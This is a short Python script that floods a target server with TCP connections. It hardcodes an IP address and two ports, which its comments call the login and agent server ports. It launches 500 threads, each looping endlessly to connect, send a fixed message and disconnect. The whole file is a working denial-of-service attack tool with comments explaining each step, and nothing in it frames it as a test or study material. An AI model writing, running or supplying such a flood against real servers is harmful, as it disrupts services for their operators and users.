import socket
import threading
import time
import random

# Target server details
target_ip = "192.168.100.88"  # The IP address of the target server.
target_ports = [5001, 5502]  # Login and Agent Server ports

# Function to simulate the flood attack
def flood():
    while True:
        for port in target_ports:  # Loop through each port in the list
            try:
                # Create a new socket using the IPv4 address family (AF_INET) and TCP protocol (SOCK_STREAM).
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                # Connect to the target server's IP and current port.
                s.connect((target_ip, port))
                
                # Send a fixed message to the server.
                s.sendall(b"Connecting . . .")
                
                # Close the socket after sending the request to release resources.
                s.close()
                
                # Wait for a random time (min,max) seconds before sending the next request.
                time.sleep(random.uniform(1, 1.5))
            except Exception as e:
                # If an error occurs (e.g., connection refused or server unreachable), print the error.
                print(f"Connection failed: {e}")
                
                # Break out of the loop for this port and continue with the next iteration.
                break

# Number of threads to create for the flood attack
num_threads = 500  # Specifies threads will be created to run the `flood` function simultaneously.

# Loop to create and start multiple threads
for i in range(num_threads):
    # Create a new thread that runs the `flood` function.
    thread = threading.Thread(target=flood)
    
    # Start the thread, which begins executing the `flood` function.
    thread.start()
